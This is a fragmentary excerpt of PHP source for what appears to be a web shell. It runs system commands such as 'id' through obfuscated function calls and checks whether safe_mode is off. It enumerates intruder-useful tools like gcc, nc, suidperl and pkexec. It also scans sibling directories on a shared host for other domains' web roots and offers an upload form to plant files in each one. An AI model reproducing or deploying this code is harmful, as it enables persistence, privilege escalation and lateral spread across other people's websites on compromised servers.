...
if ($sys == 'unix') {
	if (!@$func[31]('safe_mode')) {
		if ($func[55](exe("id")) > 0) {
			$userful = ['gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl','git','docker', 'ssh', 'pkexec'];
			$x = 0;
...
function geticon($file) {
	...
	if ($ext == 'php' || $ext == 'html' || $ext == 'js' || $ext == 'css' || $ext == 'py' || $ext == 'perl' || $ext == 'sh' || $ext == 'shtml') {
		return 'file-code';
	} else if ($ext == 'pdf') {
		return 'file-pdf';
	} else if ($ext == 'txt') {
...
function scanSubdo() {
	global $dir, $func;
	$pecahDir = explode('/', $dir);
	$rootPath1 = implode("/", array_slice($pecahDir, 0, 3));
	$rootPath2 = implode("/", array_slice($pecahDir, 0, 4));
	$obj = new StdClass();
	$getPath1 = $func[9]($rootPath1) ? $func[21]($rootPath1) : [];
	$getPath2 = $func[9]($rootPath2) ? $func[21]($rootPath2) : [];
	foreach ($getPath1 as $val) {
		$obj->$val = $rootPath1;
	}
	foreach ($getPath2 as $val) {
		$obj->$val = $rootPath2;
	}
	$subdo = new StdClass();
	foreach ($obj as $x => $y) {
		if (is_dir($y.'/'.$x)) {
			if (preg_match("/^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,6}$/i", $x)) {
				$subdo->$x = $y;
			}
		}
	}
	...
	<div class="container-lg">
		...
		<div id="tool">
			<div class="d-flex justify-content-center flex-wrap my-3">
				...
				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#subdo" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-search"></i> Scan Subdo</a>
			</div>
			...
			<div class="row">
				...
				<div class="col-md-12">
					<div class="collapse" id="subdo" data-bs-parent="#tool">
						<div class="card card-body border-dark mb-3">
							<div class="row">
								<div class="col-md-12 mb-3">
									<div class="table-responsive">
										<table class="table">
											...
											$listSubdo = scanSubdo();
											if ($listSubdo) :
												foreach ($listSubdo as $x => $y) :
											?>
												<tr>
													<td><?= $hue++; ?></td>
													<td><?= $x; ?></td>
													<td>
														<form action="?dir=<?= $y.'/'.$x ?>" method="post" enctype="multipart/form-data">
															<div class="input-group">
																<input type="file" class="form-control" name="uploadfile[]" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
																<button class="btn btn-outline-dark" type="submit" id="inputGroupFileAddon04">Upload</button>
															</div>
